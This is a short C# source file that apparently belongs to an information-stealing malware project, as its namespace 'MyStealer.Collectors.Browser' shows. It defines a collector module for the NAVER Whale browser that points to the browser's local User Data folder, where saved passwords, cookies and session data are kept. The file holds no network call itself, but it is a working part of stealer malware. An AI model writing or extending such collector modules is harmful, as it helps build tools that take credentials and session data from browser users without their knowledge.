using System.IO;
using System;

namespace MyStealer.Collectors.Browser.ChromiumBased
{
    public class NaverWhale : Chromium
    {
        public override string ModuleName => "NAVER Whale";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Naver", "Naver Whale", "User Data");
    }
}
